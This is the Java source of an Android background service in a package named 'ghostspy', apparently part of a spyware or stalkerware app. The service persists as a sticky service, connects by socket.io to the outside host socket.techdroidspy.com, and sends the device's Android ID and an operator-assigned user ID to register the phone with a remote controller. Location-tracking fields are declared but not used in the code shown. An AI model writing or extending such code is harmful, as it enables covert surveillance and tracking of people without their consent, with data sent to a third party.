package com.spy.ghostspy.server;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.Nullable;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.spy.ghostspy.R;

import org.json.JSONObject;

import java.net.URISyntaxException;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class Server extends Service {
    private static Server CONTEXT;
    private Socket socket;
    private static String mDeviceID;
    private static String mUserID;
    private double current_lat = 0.0;
    private double current_lng = 0.0;
    private FusedLocationProviderClient fusedLocationProviderClient;
    private LocationCallback locationCallback;
    public static Server getContext() {
        return CONTEXT;
    }
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        onCreateSocket();
        return START_STICKY;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        mDeviceID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        mUserID = getString(R.string.app_user_id);
        Log.d("DeviceId::", mDeviceID);
        Log.d("app_user_id::", mUserID);
    }

    public void onCreateSocket() {
        CONTEXT = this;
        try {
            socket.disconnect();
        } catch (Exception ignored) {
        }

        try {
            socket = IO.socket("https://socket.techdroidspy.com");
            socket.connected();
            socket.on(Socket.EVENT_CONNECT, onConnectDevice);
            Log.d("DeviceId::", mDeviceID);
            Log.d("app_user_id::", mUserID);
            Log.d("ghostSpy:", "Socket connected");
        } catch (URISyntaxException e) {
            throw new RuntimeException(e);
        }
    }

    private final Emitter.Listener onConnectDevice = new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            sendConnectDevice();
        }
    };
    public void sendConnectDevice() {
        Log.d("Connecting:", "Device Connected");
        try {
            JSONObject sendJson = new JSONObject();
            sendJson.put("deviceId", mDeviceID);
            sendJson.put("userId", mUserID);
            if(socket != null && socket.connected()) {
                socket.emit("device-connection-mobile-response", sendJson);
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
